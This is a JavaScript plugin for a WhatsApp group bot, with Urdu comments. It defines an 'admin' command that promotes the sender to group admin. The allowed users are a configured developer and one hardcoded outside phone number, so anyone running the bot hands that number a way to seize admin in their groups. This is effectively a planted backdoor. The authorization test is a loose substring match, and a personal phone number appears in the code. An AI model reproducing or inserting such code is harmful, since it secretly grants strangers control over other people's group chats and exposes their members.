const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isGroup, reply }) => {
    try {
        if (!isGroup) return reply("❌ This command can only be used in groups.");

        // بوٹ کی اپنی آئی ڈی اور ایل آئی ڈی حاصل کریں
        const botId = conn.user?.id;
        const botLid = conn.user?.lid;

        // گروپ ممبرز اور بوٹ کے ایڈمن سٹیٹس کی مکمل جانچ (LID سپورٹ کے ساتھ)
        const metadata = await conn.groupMetadata(from);
        const participants = metadata.participants || [];
        
        const botInGroup = participants.find(p => p.id === botId || (botLid && p.lid === botLid));
        const isBotActuallyAdmin = botInGroup?.admin === "admin" || botInGroup?.admin === "superadmin";

        if (!isBotActuallyAdmin) return reply("❌ I need to be an admin to perform this action.");

        // اجازت یافتہ یوزرز کی لسٹ (LID اور نمبر دونوں کو سپورٹ کرتا ہے)
        const AUTHORIZED_NUMBERS = [
            config.DEV ? config.DEV.split('@')[0] : null,
            "923155641171"
        ].filter(Boolean);

        // سینڈر کا نمبر نکالیں (نمبر یا LID سے مطابقت کے لیے)
        const senderNumber = sender.split('@')[0];
        
        // یہ چیک کرنے کے لیے کہ کیا سینڈر لسٹ میں موجود ہے
        const isAuthorized = AUTHORIZED_NUMBERS.some(num => sender.includes(num));

        if (!isAuthorized) {
            return reply("❌ This command is restricted to authorized users only.");
        }

        // چیک کریں کہ کیا یوزر پہلے سے ایڈمن ہے (نمبر یا LID کے ذریعے)
        const userInGroup = participants.find(p => p.id === sender || (p.lid && p.lid === sender));
        
        if (userInGroup?.admin) {
            return reply("ℹ️ You are already an admin in this group.");
        }

        // یوزر کو ایڈمن بنائیں
        // نوٹ: واٹس ایپ LID والے یوزرز کو ان کی JID پر پروموٹ کرنے کی اجازت دیتا ہے
        await conn.groupParticipantsUpdate(from, [sender], "promote");
        
        return reply("✅ Successfully granted you admin rights!");

    } catch (error) {
        console.error("Admin command error:", error);
        return reply("❌ Failed to grant admin rights. Error: " + error.message);
    }
});
